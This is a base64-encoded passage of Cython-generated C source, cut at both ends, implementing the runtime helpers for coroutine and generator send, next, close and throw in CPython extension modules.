RihleGNfdGIpO1xuICAgICAgICAjZW5kaWZcbiAgICB9XG4jZW5kaWZcbn1cbiNkZWZpbmUgX19QeXhfQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoZ2VuLCByZXN1bHQsIHJldHZhbCwgaXRlcm5leHQpXFxcbiAgICAoKHJlc3VsdCkgPT0gUFlHRU5fTkVYVCA/IChyZXR2YWwpIDogX19QeXhfX0Nvcm91dGluZV9NZXRob2RSZXR1cm5Gcm9tUmVzdWx0KGdlbiwgcmVzdWx0LCByZXR2YWwsIGl0ZXJuZXh0KSlcbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9fQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoUHlPYmplY3QqIGdlbiwgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCwgUHlPYmplY3QgKnJldHZhbCwgaW50IGl0ZXJuZXh0KSB7XG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoZ2VuKTtcbiAgICBpZiAobGlrZWx5KHJlc3VsdCA9PSBQWUdFTl9SRVRVUk4pKSB7XG4gICAgICAgIGludCBpc19hc3luYyA9IDA7XG4gICAgICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgICAgIGlzX2FzeW5jID0gX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChnZW4pO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgX19QeXhfUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24ocmV0dmFsLCBpc19hc3luYywgaXRlcm5leHQpO1xuICAgICAgICBQeV9YREVDUkVGKHJldHZhbCk7XG4gICAgfVxuICAgIHJldHVybiBOVUxMO1xufVxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuc3RhdGljIENZVEhPTl9JTkxJTkVcblB5T2JqZWN0ICpfX1B5eF9QeUdlbl9TZW5kKFB5R2VuT2JqZWN0ICpnZW4sIFB5T2JqZWN0ICphcmcpIHtcbiNpZiBQWV9WRVJTSU9OX0hFWCA8PSAweDAzMEEwMEExXG4gICAgcmV0dXJuIF9QeUdlbl9TZW5kKGdlbiwgYXJnKTtcbiNlbHNlXG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICBpZiAoUHlJdGVyX1NlbmQoKFB5T2JqZWN0KilnZW4sIGFyZyA/IGFyZyA6IFB5X05vbmUsICZyZXN1bHQpID09IFBZR0VOX1JFVFVSTikge1xuICAgICAgICBpZiAoUHlBc3luY0dlbl9DaGVja0V4YWN0KGdlbikpIHtcbiAgICAgICAgICAgIGFzc2VydChyZXN1bHQgPT0gUHlfTm9uZSk7XG4gICAgICAgICAgICBQeUVycl9TZXROb25lKFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbik7XG4gICAgICAgIH1cbiAgICAgICAgZWxzZSBpZiAocmVzdWx0ID09IFB5X05vbmUpIHtcbiAgICAgICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfU3RvcEl0ZXJhdGlvbik7XG4gICAgICAgIH1cbiAgICAgICAgZWxzZSB7XG4jaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMEExXG4gICAgICAgICAgICBfUHlHZW5fU2V0U3RvcEl0ZXJhdGlvblZhbHVlKHJlc3VsdCk7XG4jZWxzZVxuICAgICAgICAgICAgaWYgKCFQeVR1cGxlX0NoZWNrKHJlc3VsdCkgJiYgIVB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2socmVzdWx0KSkge1xuICAgICAgICAgICAgICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19TdG9wSXRlcmF0aW9uLCByZXN1bHQpO1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqZXhjID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhQeUV4Y19TdG9wSXRlcmF0aW9uLCByZXN1bHQpO1xuICAgICAgICAgICAgICAgIGlmIChsaWtlbHkoZXhjICE9IE5VTEwpKSB7XG4gICAgICAgICAgICAgICAgICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19TdG9wSXRlcmF0aW9uLCBleGMpO1xuICAgICAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZXhjKTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4jZW5kaWZcbiAgICAgICAgfVxuICAgICAgICBQeV9ERUNSRUYocmVzdWx0KTtcbiAgICAgICAgcmVzdWx0ID0gTlVMTDtcbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbiNlbmRpZlxufVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBfX1B5eF9QeVNlbmRSZXN1bHRcbl9fUHl4X0Nvcm91dGluZV9GaW5pc2hEZWxlZ2F0aW9uKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuLCBQeU9iamVjdCoqIHJldHZhbCkge1xuICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQ7XG4gICAgUHlPYmplY3QgKnZhbCA9IE5VTEw7XG4gICAgYXNzZXJ0KF9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZyhnZW4pKTtcbiAgICBfX1B5eF9Db3JvdXRpbmVfVW5kZWxlZ2F0ZShnZW4pO1xuICAgIF9fUHl4X1B5R2VuX19GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQsICZ2YWwpO1xuICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCB2YWwsIHJldHZhbCwgMCk7XG4gICAgUHlfWERFQ1JFRih2YWwpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG4jaWYgQ1lUSE9OX1VTRV9BTV9TRU5EXG5zdGF0aWMgX19QeXhfUHlTZW5kUmVzdWx0XG5fX1B5eF9Db3JvdXRpbmVfU2VuZFRvRGVsZWdhdGUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyBnZW5fYW1fc2VuZCwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJldHZhbCkge1xuICAgIFB5T2JqZWN0ICpyZXQgPSBOVUxMO1xuICAgIF9fUHl4X1B5U2VuZFJlc3VsdCBkZWxlZ2F0ZV9yZXN1bHQsIHJlc3VsdDtcbiAgICBhc3NlcnQoX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nKGdlbikpO1xuICAgIGRlbGVnYXRlX3Jlc3VsdCA9IGdlbl9hbV9zZW5kKGdlbi0+eWllbGRmcm9tLCB2YWx1ZSwgJnJldCk7XG4gICAgaWYgKGRlbGVnYXRlX3Jlc3VsdCA9PSBQWUdFTl9ORVhUKSB7XG4gICAgICAgIGFzc2VydCAocmV0ICE9IE5VTEwpO1xuICAgICAgICAqcmV0dmFsID0gcmV0O1xuICAgICAgICByZXR1cm4gUFlHRU5fTkVYVDtcbiAgICB9XG4gICAgYXNzZXJ0IChkZWxlZ2F0ZV9yZXN1bHQgIT0gUFlHRU5fRVJST1IgfHwgcmV0ID09IE5VTEwpO1xuICAgIF9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKGdlbik7XG4gICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIHJldCwgcmV0dmFsLCAwKTtcbiAgICBQeV9YREVDUkVGKHJldCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfU2VuZChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlKSB7XG4gICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7XG4gICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9BbVNlbmQoc2VsZiwgdmFsdWUsICZyZXR2YWwpO1xuICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChzZWxmLCByZXN1bHQsIHJldHZhbCwgMCk7XG59XG5zdGF0aWMgX19QeXhfUHlTZW5kUmVzdWx0XG5fX1B5eF9Db3JvdXRpbmVfQW1TZW5kKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICoqcmV0dmFsKSB7XG4gICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDtcbiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QqKSBzZWxmO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9Db3JvdXRpbmVfdGVzdF9hbmRfc2V0X2lzX3J1bm5pbmcoZ2VuKSkpIHtcbiAgICAgICAgKnJldHZhbCA9IF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbik7XG4gICAgICAgIHJldHVybiBQWUdFTl9FUlJPUjtcbiAgICB9XG4gICAgI2lmIENZVEhPTl9VU0VfQU1fU0VORFxuICAgIGlmIChnZW4tPnlpZWxkZnJvbV9hbV9zZW5kKSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kVG9EZWxlZ2F0ZShnZW4sIGdlbi0+eWllbGRmcm9tX2FtX3NlbmQsIHZhbHVlLCByZXR2YWwpO1xuICAgIH0gZWxzZVxuICAgICNlbmRpZlxuICAgIGlmIChnZW4tPnlpZWxkZnJvbSkge1xuICAgICAgICBQeU9iamVjdCAqeWYgPSBnZW4tPnlpZWxkZnJvbTtcbiAgICAgICAgUHlPYmplY3QgKnJldDtcbiAgICAgICNpZiAhQ1lUSE9OX1VTRV9BTV9TRU5EXG4gICAgICAgICNpZmRlZiBfX1B5eF9HZW5lcmF0b3JfVVNFRFxuICAgICAgICBpZiAoX19QeXhfR2VuZXJhdG9yX0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZCh5ZiwgdmFsdWUpO1xuICAgICAgICB9IGVsc2VcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRFxuICAgICAgICBpZiAoX19QeXhfQ29yb3V0aW5lX0NoZWNrKHlmKSkge1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmQoeWYsIHZhbHVlKTtcbiAgICAgICAgfSBlbHNlXG4gICAgICAgICNlbmRpZlxuICAgICAgICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRFxuICAgICAgICBpZiAoX19weXhfUHlBc3luY0dlbkFTZW5kX0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9hc3luY19nZW5fYXNlbmRfc2VuZCh5ZiwgdmFsdWUpO1xuICAgICAgICB9IGVsc2VcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAgICAgaWYgKFB5R2VuX0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9QeUdlbl9TZW5kKChQeUdlbk9iamVjdCopeWYsIHZhbHVlID09IFB5X05vbmUgPyBOVUxMIDogdmFsdWUpO1xuICAgICAgICB9IGVsc2VcbiAgICAgICAgaWYgKFB5Q29yb19DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlHZW5fU2VuZCgoUHlHZW5PYmplY3QqKXlmLCB2YWx1ZSA9PSBQeV9Ob25lID8gTlVMTCA6IHZhbHVlKTtcbiAgICAgICAgfSBlbHNlXG4gICAgICAgICNlbmRpZlxuICAgICAgI2VuZGlmXG4gICAgICAgIHtcbiAgICAgICAgICAgICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwODAwMDBcbiAgICAgICAgICAgIGlmICh2YWx1ZSA9PSBQeV9Ob25lICYmIFB5SXRlcl9DaGVjayh5ZikpXG4gICAgICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlJdGVyX05leHRfUGxhaW4oeWYpO1xuICAgICAgICAgICAgZWxzZVxuICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDEoeWYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZW5kLCB2YWx1ZSk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGxpa2VseShyZXQpKSB7XG4gICAgICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pO1xuICAgICAgICAgICAgKnJldHZhbCA9IHJldDtcbiAgICAgICAgICAgIHJldHVybiBQWUdFTl9ORVhUO1xuICAgICAgICB9XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9GaW5pc2hEZWxlZ2F0aW9uKGdlbiwgcmV0dmFsKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KGdlbiwgdmFsdWUsIHJldHZhbCwgMCk7XG4gICAgfVxuICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBpbnQgX19QeXhfQ29yb3V0aW5lX0Nsb3NlSXRlcihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiwgUHlPYmplY3QgKnlmKSB7XG4gICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDtcbiAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihnZW4pO1xuICAgIGFzc2VydChfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoZ2VuKSk7XG4gICAgI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VEXG4gICAgaWYgKF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfQ2xvc2UoeWYsICZyZXR2YWwpO1xuICAgIH0gZWxzZVxuICAgICNlbmRpZlxuICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRFxuICAgIGlmIChfX1B5eF9Db3JvdXRpbmVfQ2hlY2soeWYpKSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZSh5ZiwgJnJldHZhbCk7XG4gICAgfSBlbHNlXG4gICAgaWYgKF9fUHl4X0Nvcm91dGluZUF3YWl0X0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZUF3YWl0X0Nsb3NlKChfX3B5eF9Db3JvdXRpbmVBd2FpdE9iamVjdCopeWYpO1xuICAgIH0gZWxzZVxuICAgICNlbmRpZlxuICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VEXG4gICAgaWYgKF9fcHl4X1B5QXN5bmNHZW5BU2VuZF9DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICByZXR2YWwgPSBfX1B5eF9hc3luY19nZW5fYXNlbmRfY2xvc2UoeWYsIE5VTEwpO1xuICAgICAgICByZXN1bHQgPSBQWUdFTl9SRVRVUk47XG4gICAgfSBlbHNlXG4gICAgaWYgKF9fcHl4X1B5QXN5bmNHZW5BVGhyb3dfQ2hlY2tFeGFjdCh5ZikpIHtcbiAgICAgICAgcmV0dmFsID0gX19QeXhfYXN5bmNfZ2VuX2F0aHJvd19jbG9zZSh5ZiwgTlVMTCk7XG4gICAgICAgIHJlc3VsdCA9IFBZR0VOX1JFVFVSTjtcbiAgICB9IGVsc2VcbiAgICAjZW5kaWZcbiAgICB7XG4gICAgICAgIFB5T2JqZWN0ICptZXRoO1xuICAgICAgICByZXN1bHQgPSBQWUdFTl9SRVRVUk47XG4gICAgICAgIG1ldGggPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcih5ZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nsb3NlKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFtZXRoKSkge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSB7XG4gICAgICAgICAgICAgICAgUHlFcnJfV3JpdGVVbnJhaXNhYmxlKHlmKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHJldHZhbCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxOb0FyZyhtZXRoKTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihtZXRoKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghcmV0dmFsKSkge1xuICAgICAgICAgICAgICAgIHJlc3VsdCA9IFBZR0VOX0VSUk9SO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgfVxuICAgIFB5X1hERUNSRUYocmV0dmFsKTtcbiAgICByZXR1cm4gcmVzdWx0ID09IFBZR0VOX0VSUk9SID8gLTEgOiAwO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZW5lcmF0b3JfTmV4dChQeU9iamVjdCAqc2VsZikge1xuICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQ7XG4gICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7XG4gICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSAoX19weXhfQ29yb3V0aW5lT2JqZWN0Kikgc2VsZjtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKGdlbikpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihnZW4pO1xuICAgIH1cbiAgICAjaWYgQ1lUSE9OX1VTRV9BTV9TRU5EXG4gICAgaWYgKGdlbi0+eWllbGRmcm9tX2FtX3NlbmQpIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRUb0RlbGVnYXRlKGdlbiwgZ2VuLT55aWVsZGZyb21fYW1fc2VuZCwgUHlfTm9uZSwgJnJldHZhbCk7XG4gICAgfSBlbHNlXG4gICAgI2VuZGlmXG4gICAgaWYgKGdlbi0+eWllbGRmcm9tKSB7XG4gICAgICAgIFB5T2JqZWN0ICp5ZiA9IGdlbi0+eWllbGRmcm9tO1xuICAgICAgICBQeU9iamVjdCAqcmV0O1xuICAgICAgICAjaWZkZWYgX19QeXhfR2VuZXJhdG9yX1VTRURcbiAgICAgICAgaWYgKF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfR2VuZXJhdG9yX05leHQoeWYpO1xuICAgICAgICB9IGVsc2VcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRFxuICAgICAgICBpZiAoX19QeXhfQ29yb3V0aW5lX0NoZWNrRXhhY3QoeWYpKSB7XG4gICAgICAgICAgICByZXQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZCh5ZiwgUHlfTm9uZSk7XG4gICAgICAgIH0gZWxzZVxuICAgICAgICAjZW5kaWZcbiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiAoUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMEEzIHx8ICFDWVRIT05fVVNFX0FNX1NFTkQpXG4gICAgICAgIGlmIChQeUdlbl9DaGVja0V4YWN0KHlmKSkge1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlHZW5fU2VuZCgoUHlHZW5PYmplY3QqKXlmLCBOVUxMKTtcbiAgICAgICAgfSBlbHNlXG4gICAgICAgICNlbmRpZlxuICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlJdGVyX05leHRfUGxhaW4oeWYpO1xuICAgICAgICBpZiAobGlrZWx5KHJldCkpIHtcbiAgICAgICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7XG4gICAgICAgICAgICByZXR1cm4gcmV0O1xuICAgICAgICB9XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9GaW5pc2hEZWxlZ2F0aW9uKGdlbiwgJnJldHZhbCk7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIFB5X05vbmUsICZyZXR2YWwsIDApO1xuICAgIH1cbiAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pO1xuICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChzZWxmLCByZXN1bHQsIHJldHZhbCwgMSk7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9DbG9zZV9NZXRob2QoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICphcmcpIHtcbiAgICBQeU9iamVjdCAqcmV0dmFsID0gTlVMTDtcbiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0O1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGFyZyk7XG4gICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0Nsb3NlKHNlbGYsICZyZXR2YWwpO1xuICAgIGlmICh1bmxpa2VseShyZXN1bHQgPT0gUFlHRU5fRVJST1IpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICBQeV9YREVDUkVGKHJldHZhbCk7XG4gICAgUHlfUkVUVVJOX05PTkU7XG59XG5zdGF0aWMgX19QeXhfUHlTZW5kUmVzdWx0XG5fX1B5eF9Db3JvdXRpbmVfQ2xvc2UoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICoqcmV0dmFsKSB7XG4gICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSAoX19weXhfQ29yb3V0aW5lT2JqZWN0ICopIHNlbGY7XG4gICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDtcbiAgICBQeU9iamVjdCAqeWY7XG4gICAgaW50IGVyciA9IDA7XG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhnZW4pKSkge1xuICAgICAgICAqcmV0dmFsID0gX19QeXhfQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKTtcbiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SO1xuICAgIH1cbiAgICB5ZiA9IGdlbi0+eWllbGRmcm9tO1xuICAgIGlmICh5Zikge1xuICAgICAgICBQeV9JTkNSRUYoeWYpO1xuICAgICAgICBlcnIgPSBfX1B5eF9Db3JvdXRpbmVfQ2xvc2VJdGVyKGdlbiwgeWYpO1xuICAgICAgICBfX1B5eF9Db3JvdXRpbmVfVW5kZWxlZ2F0ZShnZW4pO1xuICAgICAgICBQeV9ERUNSRUYoeWYpO1xuICAgIH1cbiAgICBpZiAoZXJyID09IDApXG4gICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfR2VuZXJhdG9yRXhpdCk7XG4gICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIE5VTEwsIHJldHZhbCwgMSk7XG4gICAgaWYgKHJlc3VsdCA9PSBQWUdFTl9FUlJPUikge1xuICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICAgICAgaWYgKCFfX1B5eF9QeUVycl9PY2N1cnJlZCgpKSB7XG4gICAgICAgICAgICByZXR1cm4gUFlHRU5fUkVUVVJOO1xuICAgICAgICB9IGVsc2UgaWYgKGxpa2VseShfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzMihQeUV4Y19HZW5lcmF0b3JFeGl0LCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkpIHtcbiAgICAgICAgICAgIF9fUHl4X1B5RXJyX0NsZWFyKCk7XG4gICAgICAgICAgICByZXR1cm4gUFlHRU5fUkVUVVJOO1xuICAgICAgICB9XG4gICAgICAgIHJldHVybiBQWUdFTl9FUlJPUjtcbiAgICB9IGVsc2UgaWYgKGxpa2VseShyZXN1bHQgPT0gUFlHRU5fUkVUVVJOICYmICpyZXR2YWwgPT0gUHlfTm9uZSkpIHtcbiAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICAgICAgcmV0dXJuIFBZR0VOX1JFVFVSTjtcbiAgICB9IGVsc2Uge1xuICAgICAgICBjb25zdCBjaGFyICptc2c7XG4gICAgICAgIFB5X0RFQ1JFRigqcmV0dmFsKTtcbiAgICAgICAgKnJldHZhbCA9IE5VTEw7XG4gICAgICAgIGlmICgoMCkpIHtcbiAgICAgICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VEXG4gICAgICAgIH0gZWxzZSBpZiAoX19QeXhfQ29yb3V0aW5lX0NoZWNrKHNlbGYpKSB7XG4gICAgICAgICAgICBtc2cgPSAiY29yb3V0aW5lIGlnbm9yZWQgR2VuZXJhdG9yRXhpdCI7XG4gICAgICAgICNlbmRpZlxuICAgICAgICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRFxuICAgICAgICB9IGVsc2UgaWYgKF9fUHl4X0FzeW5jR2VuX0NoZWNrRXhhY3Qoc2VsZikpIHtcbiAgICAgICAgICAgIG1zZyA9ICJhc3luYyBnZW5lcmF0b3IgaWdub3JlZCBHZW5lcmF0b3JFeGl0IjtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBtc2cgPSAiZ2VuZXJhdG9yIGlnbm9yZWQgR2VuZXJhdG9yRXhpdCI7XG4gICAgICAgIH1cbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1J1bnRpbWVFcnJvciwgbXNnKTtcbiAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SO1xuICAgIH1cbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9UaHJvdyhQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnR5cCwgUHlPYmplY3QgKnZhbCwgUHlPYmplY3QgKnRiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICphcmdzLCBpbnQgY2xvc2Vfb25fZ2VuZXhpdCkge1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqKSBzZWxmO1xuICAgIFB5T2JqZWN0ICp5ZjtcbiAgICBpZiAodW5saWtlbHkoX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKGdlbikpKVxuICAgICAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKTtcbiAgICB5ZiA9IGdlbi0+eWllbGRmcm9tO1xuICAgIGlmICh5Zikge1xuICAgICAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0O1xuICAgICAgICBQeU9iamVjdCAqcmV0O1xuICAgICAgICBQeV9JTkNSRUYoeWYpO1xuICAgICAgICBpZiAoX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKHR5cCwgUHlFeGNfR2VuZXJhdG9yRXhpdCkgJiYgY2xvc2Vfb25fZ2VuZXhpdCkge1xuICAgICAgICAgICAgaW50IGVyciA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZUl0ZXIoZ2VuLCB5Zik7XG4gICAgICAgICAgICBQeV9ERUNSRUYoeWYpO1xuICAgICAgICAgICAgX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoZ2VuKTtcbiAgICAgICAgICAgIGlmIChlcnIgPCAwKVxuICAgICAgICAgICAgICAgIGdvdG8gcHJvcGFnYXRlX2V4Y2VwdGlvbjtcbiAgICAgICAgICAgIGdvdG8gdGhyb3dfaGVyZTtcbiAgICAgICAgfVxuICAgICAgICBpZiAoMFxuICAgICAgICAjaWZkZWYgX19QeXhfR2VuZXJhdG9yX1VTRURcbiAgICAgICAgICAgIHx8IF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHlmKVxuICAgICAgICAjZW5kaWZcbi